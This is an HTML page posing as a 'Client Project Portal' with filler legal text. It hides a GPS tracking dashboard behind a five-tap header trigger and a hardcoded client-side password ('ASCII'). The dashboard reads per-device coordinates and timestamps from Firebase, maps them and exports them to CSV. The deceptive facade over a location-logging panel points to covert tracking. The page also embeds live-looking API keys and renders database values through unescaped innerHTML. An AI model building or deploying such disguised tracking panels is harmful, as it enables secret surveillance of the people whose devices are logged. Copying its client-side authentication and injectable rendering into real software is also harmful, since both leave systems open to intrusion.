<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Client Project Portal</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      margin: 0;
      padding: 0;
      background: #f7f7f7;
    }
    header {
      background: #1a1a1a;
      color: white;
      padding: 20px;
      text-align: center;
    }
    main {
      padding: 30px;
      max-width: 900px;
      margin: auto;
    }
    h2 {
      margin-top: 40px;
      color: #333;
    }
    .section {
      background: white;
      padding: 20px;
      border-radius: 12px;
      margin-bottom: 30px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
    }
    .hidden {
      display: none;
    }
    #admin-login {
      text-align: center;
      margin-top: 20px;
    }
    input[type="password"], input[type="text"] {
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      width: 100%;
      border-radius: 6px;
    }
    button {
      padding: 10px 20px;
      margin-top: 10px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 8px;
    }
    th {
      background: #f0f0f0;
    }
    #map {
      height: 400px;
      width: 100%;
      border-radius: 12px;
    }
    .export-btn {
      background: #28a745;
    }
  </style>
</head>
<body>
  <header id="header">
    <h1>Client Project Portal</h1>
  </header>

  <main>
    <div class="section" id="terms">
      <h2>Client Requirements</h2>
      <p>All specifications must be approved and timestamped.</p>
    </div>

    <div class="section">
      <h2>Terms and Review</h2>
      <p>Final review will be automatically saved and verified upon access.</p>
    </div>

    <div class="section">
      <h2>Legal & Compliance</h2>
      <p>Ensure full adherence to documentation agreements.</p>
    </div>

    <div class="section">
      <h2>Locations</h2>
      <div id="map"></div>
    </div>

    <!-- Hidden admin login trigger -->
    <div id="admin-trigger" style="text-align:center; margin-top:20px; color: transparent;">.</div>

    <!-- Admin login -->
    <div id="admin-login" class="hidden">
      <h3>Enter password to access admin panel:</h3>
      <input type="password" id="admin-password" placeholder="Enter password (e.g. ASCII)" />
      <button onclick="checkAdminPassword()">Enter</button>
    </div>

    <!-- Admin Dashboard -->
    <div id="admin-panel" class="hidden section">
      <h2>Admin Dashboard</h2>
      <input type="text" id="search" placeholder="Search by device or location..." />
      <button class="export-btn" onclick="exportCSV()">Export as CSV</button>
      <p id="log-count">Daily logs: 0</p>
      <label>-- Filter by date --</label>
      <input type="date" id="dateFilter" onchange="filterByDate()" />
      <table>
        <thead>
          <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Timestamp</th></tr>
        </thead>
        <tbody id="logTable"></tbody>
      </table>
    </div>
  </main>

  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Load data to map
    let map;
    function initMap() {
      map = new google.maps.Map(document.getElementById("map"), {
        center: { lat: 7.5, lng: 5.2 },
        zoom: 8,
      });

      db.ref('locations').on('value', (snapshot) => {
        map.data.forEach(f => map.data.remove(f));
        const data = snapshot.val();
        if (!data) return;

        for (const deviceId in data) {
          for (const logId in data[deviceId]) {
            const entry = data[deviceId][logId];
            if (entry.lat && entry.lng) {
              new google.maps.Marker({
                position: { lat: entry.lat, lng: entry.lng },
                map: map,
                title: deviceId,
              });
            }
          }
        }
      });
    }

    // Tap 5x to reveal login
    let tapCount = 0;
    document.getElementById("header").addEventListener("click", () => {
      tapCount++;
      if (tapCount >= 5) {
        document.getElementById("admin-login").classList.remove("hidden");
        tapCount = 0;
      }
    });

    function checkAdminPassword() {
      const pass = document.getElementById("admin-password").value;
      if (pass === "ASCII") {
        loadLogs();
        document.getElementById("admin-panel").classList.remove("hidden");
        document.getElementById("admin-login").classList.add("hidden");
      } else {
        alert("Wrong password");
      }
    }

    let allLogs = [];
    function loadLogs() {
      db.ref('locations').once('value', snapshot => {
        const data = snapshot.val();
        const logTable = document.getElementById("logTable");
        logTable.innerHTML = "";
        allLogs = [];

        if (!data) return;

        for (const device in data) {
          for (const id in data[device]) {
            const entry = data[device][id];
            const row = {
              device: device,
              lat: entry.lat ?? "undefined",
              lng: entry.lng ?? "undefined",
              timestamp: entry.timestamp ? new Date(entry.timestamp).toLocaleString() : "Invalid Date",
            };
            allLogs.push(row);
          }
        }
        document.getElementById("log-count").innerText = `Daily logs: ${allLogs.length}`;
        displayLogs(allLogs);
      });
    }

    function displayLogs(logs) {
      const logTable = document.getElementById("logTable");
      logTable.innerHTML = "";
      logs.forEach(l => {
        logTable.innerHTML += `
          <tr>
            <td>${l.device}</td>
            <td>${l.lat}</td>
            <td>${l.lng}</td>
            <td>${l.timestamp}</td>
          </tr>`;
      });
    }

    function filterByDate() {
      const selectedDate = document.getElementById("dateFilter").value;
      if (!selectedDate) return displayLogs(allLogs);

      const filtered = allLogs.filter(l => l.timestamp.includes(selectedDate));
      displayLogs(filtered);
    }

    function exportCSV() {
      let csv = "Device,Latitude,Longitude,Timestamp\n";
      allLogs.forEach(l => {
        csv += `${l.device},${l.lat},${l.lng},${l.timestamp}\n`;
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "gps_logs.csv";
      a.click();
    }
  </script>
  <script async defer
    src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw&callback=initMap">
  </script>
</body>
                                                                                               </html>
